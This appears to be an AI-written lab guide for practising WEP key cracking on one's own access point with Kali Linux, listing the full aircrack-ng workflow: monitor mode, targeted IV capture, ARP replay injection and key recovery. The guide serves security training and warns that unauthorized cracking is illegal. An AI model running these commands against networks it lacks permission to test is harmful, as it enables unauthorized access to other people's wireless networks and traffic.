**Step-by-step lab setup guide** for practicing **WEP cracking safely and legally** using **Kali Linux** and a **wireless access point** (either real or virtualized).


## 🧪 WEP Cracking Lab Setup Guide

### 🔧 What You’ll Need:

1. **Kali Linux** (bare metal, VM with USB pass-through, or live boot)
2. **A Wireless Adapter** that supports **monitor mode & packet injection**

   * Common: **ALFA AWUS036NHA** (Atheros chipset)
3. **A Router or AP** with WEP encryption enabled

   * You can use an old router or create a virtual AP (see below).
4. A **Client device** (e.g., Android, old laptop) connected to the WEP network (for ARP injection).

---

### ⚙️ Step 1: Setup the Access Point with WEP

1. Log in to your old Wi-Fi router or virtual AP.
2. Enable **WEP encryption** (64-bit or 128-bit).
3. Set a **simple key** (e.g., `12345ABCDE`).
4. Connect a **client device** to the network to generate traffic.

---

### ⚙️ Step 2: Boot into Kali Linux

Make sure your wireless card is connected:

```bash
iwconfig
```

Look for an interface like `wlan0` or `wlan1`.

---

### ⚙️ Step 3: Enable Monitor Mode

```bash
airmon-ng start wlan0
```

Now your interface should be something like `wlan0mon`.

---

### ⚙️ Step 4: Capture Packets from Target Network

```bash
airodump-ng wlan0mon
```

Find your target network (with WEP in encryption column). Note:

* BSSID
* Channel (CH)
* ESSID (network name)

Now capture IVs:

```bash
airodump-ng --bssid <BSSID> -c <channel> -w wep_lab wlan0mon
```

---

### ⚙️ Step 5: Optional – Speed Up IV Collection

If traffic is low, force the AP to resend ARP packets:

```bash
aireplay-ng --arpreplay -b <BSSID> -h <your_MAC> wlan0mon
```

Find your MAC using:

```bash
macchanger -s wlan0mon
```

---

### ⚙️ Step 6: Crack the WEP Key

Once you have 10,000+ IVs:

```bash
aircrack-ng wep_lab-01.cap
```

It will try to recover the key using statistical methods.

---

## 🧼 Clean Up

* Stop monitor mode:

```bash
airmon-ng stop wlan0mon
```

* Reset network manager:

```bash
service NetworkManager restart
```

---

## 🧠 Tips

* 128-bit WEP takes longer to crack (more IVs needed).
* Ensure you have permission — unauthorized cracking is **illegal**.
* Simulate more traffic if your client isn’t active.
